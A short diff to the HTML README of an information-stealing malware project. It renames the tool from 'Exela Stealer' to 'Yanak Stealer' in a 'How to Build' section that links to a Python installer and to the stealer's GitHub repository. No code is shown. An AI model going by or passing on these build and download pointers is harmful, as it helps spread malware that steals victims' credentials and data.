@@ -43,7 +43,7 @@
 
   <!-- How to Build Section -->
 <h2 id="how-to-build">How to Build 🛠️</h2>
-<p>To set up Exela Stealer, follow these steps:</p>
+<p>To set up Yanak Stealer, follow these steps:</p>
 <ol>
   <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">python 3.11.0</a></li>
   <li>:arrow_down: <a href="https://github.com/eyupware/YanakStealer">Download Yanak Stealer</a></li>
